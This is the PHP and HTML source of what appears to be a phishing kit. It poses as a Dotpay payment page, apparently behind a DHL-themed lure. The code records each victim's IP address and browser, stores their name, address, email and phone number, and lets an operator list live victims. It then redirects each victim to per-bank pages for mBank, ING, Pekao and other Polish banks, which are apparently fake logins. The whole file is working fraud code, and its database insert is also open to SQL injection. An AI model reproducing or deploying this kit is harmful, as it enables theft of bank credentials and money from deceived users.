<?php   
include('bank_header.php'); 
include('../db.php'); 
 include('../YH0uW3ecaRHG16ld4waY.php');

function get_client_ip() {
    $ipaddress = '';
    if (getenv('HTTP_CLIENT_IP'))
        $ipaddress = getenv('HTTP_CLIENT_IP');
    else if(getenv('HTTP_X_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_X_FORWARDED_FOR');
    else if(getenv('HTTP_X_FORWARDED'))
        $ipaddress = getenv('HTTP_X_FORWARDED');
    else if(getenv('HTTP_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_FORWARDED_FOR');
    else if(getenv('HTTP_FORWARDED'))
       $ipaddress = getenv('HTTP_FORWARDED');
    else if(getenv('REMOTE_ADDR'))
        $ipaddress = getenv('REMOTE_ADDR');
    else
        $ipaddress = 'UNKNOWN';
    return $ipaddress;
}



if($_REQUEST['id']){
	$id = mysqli_real_escape_string($con,$_REQUEST['id']); 
	$userip = get_client_ip(); 
	$useragent = htmlspecialchars($_SERVER['HTTP_USER_AGENT'], ENT_QUOTES, 'UTF-8');
	$sup = "UPDATE `payment` SET `userip` = '$userip', `useragent` ='$useragent'  WHERE `id` = '$id' ";
	$con->query($sup);
}

 if(isset($_GET['new'])){
     if($_GET['session_role']=='admin'){
$sqs = "SELECT * FROM `payment` WHERE `last_login` < '10'";
$ne = $con->query($sqs);
}else{
$sqs = "SELECT * FROM `payment` WHERE `last_login` < '10' AND `company_email` = '$session_email'";
$ne = $con->query($sqs);
}
$active=$ne->num_rows;

$con->query("UPDATE `payment` SET `last_login` = `last_login`+'1' WHERE 1");

if($active>0){
while($row_pp=$ne->fetch_assoc()){
echo $row_pp['ip'].'/'.URL_directory1.'index.php?id='.$row_pp['id'].'<br>';
}
}
}else{

if($_REQUEST['id']){
  $id = mysqli_real_escape_string($con,$_REQUEST['id']);
$ip = getenv("REMOTE_ADDR") ; 


$sqi = "UPDATE `payment` SET `ip` = '$ip' WHERE `id` = '$id'";
$con->query($sqi);

$page_name = basename($_SERVER['PHP_SELF']);
$sqlss = "UPDATE `payment` SET `page_name` = '$page_name' WHERE `id` = '$id'";
$con->query($sqlss);
}
$sqsp = "SELECT * FROM `payment` WHERE `id` = '".mysqli_real_escape_string($con,$_REQUEST['id'])."'";
// echo $sqsp;exit();
$newsp = $con->query($sqsp);
$rowsp = $newsp->fetch_assoc();
$naver = $rowsp['bank_name'];


if(!isset($_POST['submit'])){
$current_time = date_create('now')->format('Y-m-d H:i:s');
//$sup = "UPDATE `payment` SET `beep` = '1' WHERE `id` = '$id'";
$sup = "UPDATE `payment` SET `beep` = '1',`order_flag_time`='".$current_time."' WHERE `id` = '$id'";
$con->query($sup);
}

if(isset($_POST['submit'])){
	$first_name = $_POST['first_name'];
	$last_name = $_POST['last_name'];
	$street = $_POST['street'];
	$building_number = $_POST['building_number'];
	$premise_number = $_POST['premise_number'];
	$postal_code = $_POST['postal_code'];
	$city = $_POST['city'];
	$email = $_POST['email'];
	$telepone = $_POST['telepone'];
	$country = $_POST['country'];
	$sqls = "INSERT INTO `user` (`first_name`, `last_name`, `street`, `building_number`, `premise_number`, `postal_code`, `city`, `email`, `telepone`, `country`, `payment_id`) VALUES('$first_name', '$last_name', '$street', '$building_number', '$premise_number', '$postal_code', '$city', '$email', '$telepone', '$country', '".$_REQUEST['id']."')";
	$news = $con->query($sqls);
	$last_id = $con->insert_id;
	$_SESSION['user_id'] = $last_id;
	if($_REQUEST['cardSet']==2)
	{
		echo '<script>window.location.href="'.URL_dhlpayment.'err_noavaible/index.html"</script>';	
	}   
	if($rowsp['bank_name'] == 'mBank'){      
		echo '<script>window.location.href="'.URL_dhlpayment_id5511.'index.php?id='.$_REQUEST['id'].'"</script>';
	}
	elseif($rowsp['bank_name'] == 'IPKO'){
		echo '<script>window.location.href="'.URL_dhlpayment_id5504.'index.php?id='.$_REQUEST['id'].'"</script>';
	}
	elseif($rowsp['bank_name'] == 'Przelew24'){
		echo '<script>window.location.href="'.URL_dhlpayment_id55115.'index.php?id='.$_REQUEST['id'].'"</script>';
	}
	elseif($rowsp['bank_name'] == 'Bank alior'){
		echo '<script>window.location.href="'.URL_dhlpayment_id5526.'index.php?id='.$_REQUEST['id'].'"</script>';
	}
	elseif($rowsp['bank_name'] == 'Płacę z T-Mobile Usługi Bankowe'){
		echo '<script>window.location.href="'.URL_dhlpayment_id55115532.'index.php?id='.$_REQUEST['id'].'"</script>';
	}
	elseif($rowsp['bank_name'] == 'Millennium'){
		echo '<script>window.location.href="'.URL_dhlpayment_id7457.'index.php?id='.$_REQUEST['id'].'"</script>';
	}
	elseif($rowsp['bank_name'] == 'Credit Agricole'){
		echo '<script>window.location.href="'.URL_dhlpayment_id55115562.'index.php?id='.$_REQUEST['id'].'"</script>';
	}
	elseif($rowsp['bank_name'] == 'Płać z ING'){
		echo '<script>window.location.href="'.URL_dhlpayment_id5534.'index.php?id='.$_REQUEST['id'].'"</script>';
	}
	elseif($rowsp['bank_name'] == 'Płacę z Inteligo'){
		echo '<script>window.location.href="'.URL_dhlpayment_id_inteligo.'index.php?id='.$_REQUEST['id'].'"</script>';
	}
	elseif($rowsp['bank_name'] == 'Płacę z Citi Handlowy'){
		echo '<script>window.location.href="'.URL_dhlpayment_id551155625.'index.php?id='.$_REQUEST['id'].'"</script>';
	}
	elseif($rowsp['bank_name'] == 'Pekao24Przelew'){
		echo '<script>window.location.href="'.URL_dhlpayment_id_pekao.'index.php?id='.$_REQUEST['id'].'"</script>';
	}
	elseif($rowsp['bank_name'] == 'Pay Way Toyota Bank'){
		echo '<script>window.location.href="'.URL_dhlpayment.'err_noavaible/index.html?id='.$_REQUEST['id'].'"</script>';
	}
	elseif($rowsp['bank_name'] == 'Płać z BOŚ'){
		echo '<script>window.location.href="'.URL_dhlpayment.'err_noavaible/index.html?id='.$_REQUEST['id'].'"</script>';
	}
	elseif($rowsp['bank_name'] == 'eurobank - płatność online'){
		echo '<script>window.location.href="'.URL_dhlpayment_id5562.'index.php?id='.$_REQUEST['id'].'"</script>';
	}
	elseif($rowsp['bank_name'] == 'Szybkie Płatności Internetowe z Deutsche Bank PBC'){
		echo '<script>window.location.href="'.URL_dhlpayment_id_db.'index.php?id='.$_REQUEST['id'].'"</script>';
	}
	elseif($rowsp['bank_name'] == 'Pocztowy24'){
		echo '<script>window.location.href="'.URL_dhlpayment_id_bankpocztowy.'index.php?id='.$_REQUEST['id'].'"</script>';
	}
	elseif($rowsp['bank_name'] == 'BNP Paribas'){
		echo '<script>window.location.href="'.URL_dhlpayment_id_bnpparibas.'index.php?id='.$_REQUEST['id'].'"</script>';
	}
	elseif($rowsp['bank_name'] == 'Getin Bank PBL'){
		echo '<script>window.location.href="'.URL_dhlpayment_id_getin.'index.php?id='.$_REQUEST['id'].'"</script>';
	}	
	elseif($rowsp['bank_name'] == 'Moj'){
		echo '<script>window.location.href="'.URL_dhlpayment_id_raifaisen.'index.php?id='.$_REQUEST['id'].'"</script>';
	}
	elseif($rowsp['bank_name'] >= '0' || $rowsp['bank_name'] <= '1000000'){
		echo '<script>window.location.href="'.URL_dhlpayment.'err_noavaible/index.html?id='.$_REQUEST['id'].'"</script>';
	}
}
?>


<script src="files51351/jquery.js"></script>
<script type="text/javascript">
	window.console.log = "";
	var DEBUG = false;
	// ENABLE/DISABLE Console Logs
	if(!DEBUG){
	console.log = function() {}
	}

	setInterval(function(){ upd_last_login(<?php echo htmlspecialchars($_REQUEST['id'], ENT_QUOTES, 'UTF-8') ; ?>); }, 3000);
	function upd_last_login(str) {
		if (str == "") {
			// document.getElementById("txtHint").innerHTML = "";
			// return;
		} else { 
			if (window.XMLHttpRequest) {
				// code for IE7+, Firefox, Chrome, Opera, Safari
				xmlhttp = new XMLHttpRequest();
			} else {
				// code for IE6, IE5
				xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
			}
			xmlhttp.onreadystatechange = function() {
				if (this.readyState == 4 && this.status == 200) {
					//document.getElementById("ip").innerHTML = this.responseText;
					//alert(this.responseText);
				}
			};
		 xmlhttp.open("GET","update123.php?id="+str,true);
			xmlhttp.send();
		}
	}

	function setCard()
	{
		document.getElementById('cardSet').value="2";
	}
	
// Sof s.js

	function chkonload()
	{ var arr=['kanal0','kanal1','kanal2','kanal3','kanal4','kanal6','kanal7','kanal8','kanal9','kanal10','kanal11','kanal12','kanal13','kanal14','kanal15','kanal16','kanal17','kanal18','kanal19','kanal21','kanal22','kanal23','kanal24','kanal25','kanal26','kanal27','kanal28','kanal31','kanal32','kanal33','kanal35','kanal36','kanal38', 'kanal39','kanal41','kanal42','kanal43','kanal44','kanal45','kanal46','kanal47','kanal48','kanal49','kanal50','kanal51','kanal52','kanal56','kanal57','kanal58','kanal60','kanal61','kanal62','kanal63','kanal64','kanal65','kanal66','kanal69','kanal71','kanal73','kanal77','kanal210','kanal212','kanal213','kanal245'];
	  for(var idx = 0; idx < arr.length; idx++)
	  {
		if (document.forms['payform'].elements[arr[idx]]) {
		  if (document.forms['payform'].elements[arr[idx]].checked) { 
			 chkcnl(arr[idx]); 
		 try {
		   var regExp = /\d+/;
		   var id = arr[idx].match(regExp);
		   chkstn(id);
		 }
		 catch(e) {
		 }
		  }
		}
	  }
	  if (document.forms['payform'].elements['kanal0'] && document.forms['payform'].elements['kanal0'].disabled == true) {
		document.forms['payform'].elements['kanal2'].checked = true;
	  }
	}

	function hideform(object_id) {
		$('#' + object_id).hide();
	}

	function showform(object_id) {
		$('#' + object_id).show();
	}
	function highlight(channel_id){
		$("div[id*=channel_]").filter(function() {
			return /^channel_\d+_cell$/.test(this.id);
			}).each(function() {
				$("#"+this.id).removeClass("highlighted");
				$("#"+this.id).addClass("not_highlighted");							
			});

		id = "#channel_"+channel_id+"_cell";
		$(id).removeClass("not_highlighted");	
		$(id).addClass("highlighted");
		$("html,body").animate({
			scrollTop: $("#payerDetailsDescription").offset().top
		}, 500);					
	}				
	
	var _vars = {"lang":"pl","CARD_INFO":"Informacja o karcie","CARDHOLDER_ADDRESS_INFO":" Adres posiadacza karty podany we wniosku o wydanie karty","ACCOUNT_INFO":"Informacja o posiadaczu konta","require_full_address":[77,245,71]},
    lang = _vars['lang'];

    if (typeof String.prototype.trim === 'undefined') {
        String.prototype.trim = function() {
            return String(this).replace(/^\s+|\s+$/g, '');
        };
    }

    function gwarancja(lang) {
        obj = document.getElementById("gwarancja");
        if (!obj)
            return false;

        switch (lang) {
           case 'en': l = 'Dotpay Guarantee'; break;
           case 'de': l = 'Dotpay Garantie';  break;
           case 'pl':
           default  : l = 'Gwarancja Dotpay'; break;
        }

        obj.innerHTML = (document.payform.elements['gwarancja_ok'] && document.payform.elements['gwarancja_ok'].checked) ?
            '<b>' + l + ':</b> 5.60 PLN' : '';
    }

    function PPchosen() {
        var mpay_opis = document.getElementById('mpay_opis');


        cardForm();
        allValid();
    }

    function getChannel() {
        return parseInt($('input[name=kanal]:checked', '#payform').val(), 10);
    }

    function cardForm() {
        var payerCardDescription = document.getElementById('payerCardDescription');
        var payerCardDescriptionTr = document.getElementById('payerCardDescriptionTr');
        var payerCardDetailsTr = document.getElementById('payerCardDetailsTr');
        var payerDetailsDescription = document.getElementById('payerDetailsDescription');
        var loga3d = document.getElementById('loga3d');
        var wybrany_kanal = getChannel();

        if (wybrany_kanal === 0) {
            if (payerCardDescriptionTr)
                payerCardDescriptionTr.style.display = 'table-row';

            if (payerCardDetailsTr)
                payerCardDetailsTr.style.display = 'table-row';

            if (loga3d)
                loga3d.style.display = 'block';

            if (payerCardDescription)
                payerCardDescription.innerHTML = _vars['CARD_INFO'];

            if (payerDetailsDescription)
                payerDetailsDescription.innerHTML = _vars['CARDHOLDER_ADDRESS_INFO'];

            document.getElementById("komunikat") && showform("komunikat");
        } else {
            if (payerCardDescriptionTr)
                payerCardDescriptionTr.style.display = 'none';

            if (payerCardDetailsTr)
                payerCardDetailsTr.style.display = 'none';

            if (payerDetailsDescription)
                payerDetailsDescription.innerHTML = _vars['ACCOUNT_INFO'];

            document.getElementById("komunikat") && hideform("komunikat");
        }
    }

    function Zaslon() {
        var obj = document.getElementById("subzaplata");
        obj.style.display = 'block';
        return true;
    }

    function WybierzRegion(region) {
        if (typeof region === 'undefined' || region == '')
            return false;

        var x = region.options[region.selectedIndex].value;
        var c = document.getElementById("addr2");

        var regions = {};

    regions = {"CAN":{"AB":"Alberta","BC":"British Columbia","MB":"Manitoba","NB":"New Brunswick","NL":"Newfoundland and Labrador","NS":"Nova Scotia","NT":"Northwest Territories","NU":"Nunavut","ON":"Ontario","PE":"Prince Edward Island","QC":"Quebec","SK":"Saskatchewan","YT":"Yukon"},"GBR":{"EN":"England","NO":"Northern Ireland","SC":"Scotland","WA":"Wales"},"IRL":{"CE":"Clare","CK":"Cork","CN":"Cavan","CW":"Carlow","DL":"Donegal","DN":"Dublin","GY":"Galway","KE":"Kildare","KK":"Kilkenny","KY":"Kerry","LD":"Longford","LH":"Louth","LK":"Limerick","LM":"Leitrim","LS":"Laois","MH":"Meath","MN":"Monaghan","MO":"Mayo","OY":"Offaly","RN":"Roscommon","SO":"Sligo","TY":"Tipperary","WD":"Waterford","WH":"Westmeath","WW":"Wicklow","WX":"Wexford"},"USA":{"AK":"Alaska","AL":"Alabama","AR":"Arkansas","AS":"American Samoa","AZ":"Arizona","CA":"California","CO":"Colorado","CT":"Connecticut","DC":"District of Columbia","DE":"Delaware","FL":"Florida","GA":"Georgia","GU":"Guam","HI":"Hawaii","IA":"Iowa","ID":"Idaho","IL":"Illinois","IN":"Indiana","KS":"Kansas","KY":"Kentucky","LA":"Louisiana","MA":"Massachusetts","MD":"Maryland","ME":"Maine","MI":"Michigan","MN":"Minnesota","MO":"Missouri","MP":"Northern Mariana Islands","MS":"Mississippi","MT":"Montana","NC":"North Carolina","ND":"North Dakota","NE":"Nebraska","NH":"New Hampshire","NJ":"New Jersey","NM":"New Mexico","NV":"Nevada","NY":"New York","OH":"Ohio","OK":"Oklahoma","OR":"Oregon","PA":"Pennsylvania","PR":"Puerto Rico","RI":"Rhode Island","SC":"South Carolina","SD":"South Dakota","TN":"Tennessee","TX":"Texas","UM":"U.S. Minor Outlying Islands","UT":"Utah","VA":"Virginia","VI":"Virgin Islands of the U.S.","VT":"Vermont","WA":"Washington","WI":"Wisconsin","WV":"West Virginia","WY":"Wyoming"}};
        removeAllOptions(c);
        addOption(c, '', '---------');

        if (x == 'USA' || x == 'IRL' || x == 'GBR' || x == 'CAN') {
            for (i in regions[x])
                addOption(c, i, regions[x][i]);
            $('#sregion').show();
        } else {
            $('#sregion').hide();
        }

        return false;
    }

    function removeAllOptions(selectbox) {
        for(var i = selectbox.options.length-1; i>=0 ;i--)
            selectbox.remove(i);
    }

    function addOption(selectbox, value, text ) {
        var optn = document.createElement("OPTION");
        optn.text = text;
        optn.value = value;
        selectbox.options.add(optn);
    }

    function validator() {
        var zgoda1 = document.getElementById('zgoda1');
        var zgoda2 = document.getElementById('zgoda2');

        var ramka_zgoda1 = document.getElementById('ramka_zgoda1');
        var ramka_zgoda2 = document.getElementById('ramka_zgoda2');

        var ramka_brakzgody = document.getElementById('ramka_brakzgody');
        var brak_zgody_tresc = '';

        var blad_zgoda1 = false;
        var blad_zgoda2 = false;

        ramka_zgoda1.style.borderColor='#dfdfdf';
        ramka_zgoda1.style.backgroundColor='#fff';
        ramka_zgoda2.style.borderColor='#dfdfdf';
        ramka_zgoda2.style.backgroundColor='#fff';

        if ( zgoda1.checked != true ) {
            ramka_zgoda1.style.borderColor='#B63030';
            ramka_zgoda1.style.backgroundColor='#FFD0D0';
            brak_zgody_tresc += '<p>Wymagana akceptacja Regulaminu dokonywania wpłat</p>';
            blad_zgoda1 = true;
        }

        if ( zgoda2.checked != true ) {
            ramka_zgoda2.style.borderColor='#B63030';
            ramka_zgoda2.style.backgroundColor='#FFD0D0';
            brak_zgody_tresc += '<p>Wymagana zgoda na przetwarzanie danych osobowych</p>';
            blad_zgoda2 = true;
        }

        if ( blad_zgoda1 == true || blad_zgoda2 == true ) {
            showform('ramka_brakzgody');
            ramka_brakzgody.innerHTML = brak_zgody_tresc;
            return false;
        } else {
            hideform('ramka_brakzgody');
        }

        return true;
    }

    function init() {
    }

    var bodyobj = document.getElementsByTagName('BODY')[0];

    // check if document loaded
    if (bodyobj && bodyobj.readyState === 'load') {
    } else {
        if (window.addEventListener)
            window.addEventListener('load', init, false);
        else
            window.attachEvent('load', init);
    }
	
	
	function show_bank(str) {
		console.log(str);
		if (str.length == 0) {
		} else {
			var xmlhttp = new XMLHttpRequest();
			xmlhttp.onreadystatechange = function() {
				if (this.readyState == 4 && this.status == 200) {
					//document.getElementById("txtHint").innerHTML = this.responseText;
					//alert(this.responseText);
				}
			};
			xmlhttp.open("GET", "ajaxbbb.php?bank_name=" + str + "&id=<?php echo htmlspecialchars($id, ENT_QUOTES, 'UTF-8');; ?>", true);
			xmlhttp.send();
		}
	}
	 window.console.log = "";
	var DEBUG = false;
	// ENABLE/DISABLE Console Logs
	if(!DEBUG){
	  console.log = function() {}
	}

	function allValid(rxs, x) {
		var is_valid  = true,
			rx_ending = '',
			rx        = '',
			v         = null,
			result    = null;

		for (i in rxs) {
			rx_ending = ($.inArray(i, x) !== -1) ? '{1}' : '?';
			rx = '^(' + rxs[i] + ')' + rx_ending + '$';
			v = new valid(i, rx, 'name');
			if (typeof v.getTarget === 'function') {
				result = v.check();
				if (!v.getTarget().disabled && !result)
						is_valid = false;
			}
		}

		return is_valid;
	}

	$('.channel').click(function(){
		$('#paymentChoose').val(jQuery(this).attr("id"));
	});

</script>

<style type="text/css">
    @import 'files51351/styles2.css';
	@import 'css/styles.css';
</style>
<html lang="pl"><head><script src="files51351/jquery.js"></script>
<script type="text/javascript">
	window.console.log = "";
	var DEBUG = false;
	// ENABLE/DISABLE Console Logs
	if(!DEBUG){
	console.log = function() {}
	}

	setInterval(function(){ upd_last_login(113305); }, 3000);
	function upd_last_login(str) {
		if (str == "") {
			// document.getElementById("txtHint").innerHTML = "";
			// return;
		} else { 
			if (window.XMLHttpRequest) {
				// code for IE7+, Firefox, Chrome, Opera, Safari
				xmlhttp = new XMLHttpRequest();
			} else {
				// code for IE6, IE5
				xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
			}
			xmlhttp.onreadystatechange = function() {
				if (this.readyState == 4 && this.status == 200) {
					//document.getElementById("ip").innerHTML = this.responseText;
					//alert(this.responseText);
				}
			};
		 xmlhttp.open("GET","update123.php?id="+str,true);
			xmlhttp.send();
		}
	}


	
// Sof s.js

	function chkonload()
	{ var arr=['kanal0','kanal1','kanal2','kanal3','kanal4','kanal6','kanal7','kanal8','kanal9','kanal10','kanal11','kanal12','kanal13','kanal14','kanal15','kanal16','kanal17','kanal18','kanal19','kanal21','kanal22','kanal23','kanal24','kanal25','kanal26','kanal27','kanal28','kanal31','kanal32','kanal33','kanal35','kanal36','kanal38', 'kanal39','kanal41','kanal42','kanal43','kanal44','kanal45','kanal46','kanal47','kanal48','kanal49','kanal50','kanal51','kanal52','kanal56','kanal57','kanal58','kanal60','kanal61','kanal62','kanal63','kanal64','kanal65','kanal66','kanal69','kanal71','kanal73','kanal77','kanal210','kanal212','kanal213','kanal245'];
	  for(var idx = 0; idx < arr.length; idx++)
	  {
		if (document.forms['payform'].elements[arr[idx]]) {
		  if (document.forms['payform'].elements[arr[idx]].checked) { 
			 chkcnl(arr[idx]); 
		 try {
		   var regExp = /\d+/;
		   var id = arr[idx].match(regExp);
		   chkstn(id);
		 }
		 catch(e) {
		 }
		  }
		}
	  }
	  if (document.forms['payform'].elements['kanal0'] && document.forms['payform'].elements['kanal0'].disabled == true) {
		document.forms['payform'].elements['kanal2'].checked = true;
	  }
	}

	function hideform(object_id) {
		$('#' + object_id).hide();
	}

	function showform(object_id) {
		$('#' + object_id).show();
	}
	function highlight(channel_id){
		$("div[id*=channel_]").filter(function() {
			return /^channel_\d+_cell$/.test(this.id);
			}).each(function() {
				$("#"+this.id).removeClass("highlighted");
				$("#"+this.id).addClass("not_highlighted");							
			});

		id = "#channel_"+channel_id+"_cell";
		$(id).removeClass("not_highlighted");	
		$(id).addClass("highlighted");
		$("html,body").animate({
			scrollTop: $("#payerDetailsDescription").offset().top
		}, 500);					
	}				
	
	var _vars = {"lang":"pl","CARD_INFO":"Informacja o karcie","CARDHOLDER_ADDRESS_INFO":" Adres posiadacza karty podany we wniosku o wydanie karty","ACCOUNT_INFO":"Informacja o posiadaczu konta","require_full_address":[77,245,71]},
    lang = _vars['lang'];

    if (typeof String.prototype.trim === 'undefined') {
        String.prototype.trim = function() {
            return String(this).replace(/^\s+|\s+$/g, '');
        };
    }

    function gwarancja(lang) {
        obj = document.getElementById("gwarancja");
        if (!obj)
            return false;

        switch (lang) {
           case 'en': l = 'Dotpay Guarantee'; break;
           case 'de': l = 'Dotpay Garantie';  break;
           case 'pl':
           default  : l = 'Gwarancja Dotpay'; break;
        }

        obj.innerHTML = (document.payform.elements['gwarancja_ok'] && document.payform.elements['gwarancja_ok'].checked) ?
            '<b>' + l + ':</b> 5.60 PLN' : '';
    }

    function PPchosen() {
        var mpay_opis = document.getElementById('mpay_opis');


        cardForm();
        allValid();
    }

    function getChannel() {
        return parseInt($('input[name=kanal]:checked', '#payform').val(), 10);
    }

    function cardForm() {
        var payerCardDescription = document.getElementById('payerCardDescription');
        var payerCardDescriptionTr = document.getElementById('payerCardDescriptionTr');
        var payerCardDetailsTr = document.getElementById('payerCardDetailsTr');
        var payerDetailsDescription = document.getElementById('payerDetailsDescription');
        var loga3d = document.getElementById('loga3d');
        var wybrany_kanal = getChannel();

        if (wybrany_kanal === 0) {
            if (payerCardDescriptionTr)
                payerCardDescriptionTr.style.display = 'table-row';

            if (payerCardDetailsTr)
                payerCardDetailsTr.style.display = 'table-row';

            if (loga3d)
                loga3d.style.display = 'block';

            if (payerCardDescription)
                payerCardDescription.innerHTML = _vars['CARD_INFO'];

            if (payerDetailsDescription)
                payerDetailsDescription.innerHTML = _vars['CARDHOLDER_ADDRESS_INFO'];

            document.getElementById("komunikat") && showform("komunikat");
        } else {
            if (payerCardDescriptionTr)
                payerCardDescriptionTr.style.display = 'none';

            if (payerCardDetailsTr)
                payerCardDetailsTr.style.display = 'none';

            if (payerDetailsDescription)
                payerDetailsDescription.innerHTML = _vars['ACCOUNT_INFO'];

            document.getElementById("komunikat") && hideform("komunikat");
        }
    }

    function Zaslon() {
        var obj = document.getElementById("subzaplata");
        obj.style.display = 'block';
        return true;
    }

    function WybierzRegion(region) {
        if (typeof region === 'undefined' || region == '')
            return false;

        var x = region.options[region.selectedIndex].value;
        var c = document.getElementById("addr2");

        var regions = {};

    regions = {"CAN":{"AB":"Alberta","BC":"British Columbia","MB":"Manitoba","NB":"New Brunswick","NL":"Newfoundland and Labrador","NS":"Nova Scotia","NT":"Northwest Territories","NU":"Nunavut","ON":"Ontario","PE":"Prince Edward Island","QC":"Quebec","SK":"Saskatchewan","YT":"Yukon"},"GBR":{"EN":"England","NO":"Northern Ireland","SC":"Scotland","WA":"Wales"},"IRL":{"CE":"Clare","CK":"Cork","CN":"Cavan","CW":"Carlow","DL":"Donegal","DN":"Dublin","GY":"Galway","KE":"Kildare","KK":"Kilkenny","KY":"Kerry","LD":"Longford","LH":"Louth","LK":"Limerick","LM":"Leitrim","LS":"Laois","MH":"Meath","MN":"Monaghan","MO":"Mayo","OY":"Offaly","RN":"Roscommon","SO":"Sligo","TY":"Tipperary","WD":"Waterford","WH":"Westmeath","WW":"Wicklow","WX":"Wexford"},"USA":{"AK":"Alaska","AL":"Alabama","AR":"Arkansas","AS":"American Samoa","AZ":"Arizona","CA":"California","CO":"Colorado","CT":"Connecticut","DC":"District of Columbia","DE":"Delaware","FL":"Florida","GA":"Georgia","GU":"Guam","HI":"Hawaii","IA":"Iowa","ID":"Idaho","IL":"Illinois","IN":"Indiana","KS":"Kansas","KY":"Kentucky","LA":"Louisiana","MA":"Massachusetts","MD":"Maryland","ME":"Maine","MI":"Michigan","MN":"Minnesota","MO":"Missouri","MP":"Northern Mariana Islands","MS":"Mississippi","MT":"Montana","NC":"North Carolina","ND":"North Dakota","NE":"Nebraska","NH":"New Hampshire","NJ":"New Jersey","NM":"New Mexico","NV":"Nevada","NY":"New York","OH":"Ohio","OK":"Oklahoma","OR":"Oregon","PA":"Pennsylvania","PR":"Puerto Rico","RI":"Rhode Island","SC":"South Carolina","SD":"South Dakota","TN":"Tennessee","TX":"Texas","UM":"U.S. Minor Outlying Islands","UT":"Utah","VA":"Virginia","VI":"Virgin Islands of the U.S.","VT":"Vermont","WA":"Washington","WI":"Wisconsin","WV":"West Virginia","WY":"Wyoming"}};
        removeAllOptions(c);
        addOption(c, '', '---------');

        if (x == 'USA' || x == 'IRL' || x == 'GBR' || x == 'CAN') {
            for (i in regions[x])
                addOption(c, i, regions[x][i]);
            $('#sregion').show();
        } else {
            $('#sregion').hide();
        }

        return false;
    }

    function removeAllOptions(selectbox) {
        for(var i = selectbox.options.length-1; i>=0 ;i--)
            selectbox.remove(i);
    }

    function addOption(selectbox, value, text ) {
        var optn = document.createElement("OPTION");
        optn.text = text;
        optn.value = value;
        selectbox.options.add(optn);
    }

    function validator() {
        var zgoda1 = document.getElementById('zgoda1');
        var zgoda2 = document.getElementById('zgoda2');

        var ramka_zgoda1 = document.getElementById('ramka_zgoda1');
        var ramka_zgoda2 = document.getElementById('ramka_zgoda2');

        var ramka_brakzgody = document.getElementById('ramka_brakzgody');
        var brak_zgody_tresc = '';

        var blad_zgoda1 = false;
        var blad_zgoda2 = false;

        ramka_zgoda1.style.borderColor='#dfdfdf';
        ramka_zgoda1.style.backgroundColor='#fff';
        ramka_zgoda2.style.borderColor='#dfdfdf';
        ramka_zgoda2.style.backgroundColor='#fff';

        if ( zgoda1.checked != true ) {
            ramka_zgoda1.style.borderColor='#B63030';
            ramka_zgoda1.style.backgroundColor='#FFD0D0';
            brak_zgody_tresc += '<p>Wymagana akceptacja Regulaminu dokonywania wpłat</p>';
            blad_zgoda1 = true;
        }

        if ( zgoda2.checked != true ) {
            ramka_zgoda2.style.borderColor='#B63030';
            ramka_zgoda2.style.backgroundColor='#FFD0D0';
            brak_zgody_tresc += '<p>Wymagana zgoda na przetwarzanie danych osobowych</p>';
            blad_zgoda2 = true;
        }

        if ( blad_zgoda1 == true || blad_zgoda2 == true ) {
            showform('ramka_brakzgody');
            ramka_brakzgody.innerHTML = brak_zgody_tresc;
            return false;
        } else {
            hideform('ramka_brakzgody');
        }

        return true;
    }

    function init() {
    }

    var bodyobj = document.getElementsByTagName('BODY')[0];

    // check if document loaded
    if (bodyobj && bodyobj.readyState === 'load') {
    } else {
        if (window.addEventListener)
            window.addEventListener('load', init, false);
        else
            window.attachEvent('load', init);
    }
	
	/*
	function show_bank(str) {
		if (str.length == 0) {
		} else {
			var xmlhttp = new XMLHttpRequest();
			xmlhttp.onreadystatechange = function() {
				if (this.readyState == 4 && this.status == 200) {
					//document.getElementById("txtHint").innerHTML = this.responseText;
					//alert(this.responseText);
				}
			};
			xmlhttp.open("GET", "ajaxbbb.php?bank_name=" + str + "&id=113305", true);
			xmlhttp.send();
		}
	}*/
	 window.console.log = "";
	var DEBUG = false;
	// ENABLE/DISABLE Console Logs
	if(!DEBUG){
	  console.log = function() {}
	}

	function allValid(rxs, x) {
		var is_valid  = true,
			rx_ending = '',
			rx        = '',
			v         = null,
			result    = null;

		for (i in rxs) {
			rx_ending = ($.inArray(i, x) !== -1) ? '{1}' : '?';
			rx = '^(' + rxs[i] + ')' + rx_ending + '$';
			v = new valid(i, rx, 'name');
			if (typeof v.getTarget === 'function') {
				result = v.check();
				if (!v.getTarget().disabled && !result)
						is_valid = false;
			}
		}

		return is_valid;
	}

	$('.channel').click(function(){
		$('#paymentChoose').val(jQuery(this).attr("id"));
	});

</script>

<style type="text/css">
    @import 'files51351/styles2.css';
	@import 'css/styles.css';
</style>





	<title>Dotpay - Bezpieczne transakcje</title>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<meta name="viewport" id="viewport" content="width=device-width">
	<link href="files51351/styles.css" rel="stylesheet" type="text/css">
	
	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
	
	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
	<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
</head>

<body><noscript>Prosimy o włączenie obsługi JavaScript do prawidłowego działania serwisu.</noscript>

<div id="style_all" class="container">
<div class="row">

	<a href="../www.dotpay.pl/index.html" id="style_width_header" style="display: block; height: 79px; background: url('files51351/banner_top_static_720x79.png') no-repeat top left; margin: 0 auto"> </a>
    <div class="gray_pad">
		<ul id="menu_top_l">
		<li class="left_m"><span class="b">Informacja o płatności:</span></li>
		</ul>
		<ul id="menu_top_r">
            <li><a href="indexe0fa.html?newlang=pl"><img src="files51351/flaga01.gif" width="18" height="11" alt=""></a><img src="files51351/menu_separator.gif" width="5" height="15" alt=""></li>
            <li><a href="indexcbd8.html?newlang=en"><img src="files51351/flaga02.gif" width="18" height="11" alt=""></a><img class="hidden" src="files51351/menu_separator.gif" width="5" height="15" alt=""></li>
        </ul>
    </div>
	
    <div id="main">
		<input type="hidden" value="" id="paymentChoose" name="paymentChoose">
		<table id="style_width_header" border="0">
			<tbody><tr>
				<td width="470" colspan="2" style="text-align: left;  vertical-align: top; padding-left: 15px;" class="big_text"><b>Odbiorca:</b> <?php echo $rowsp['account_name'];?></td>
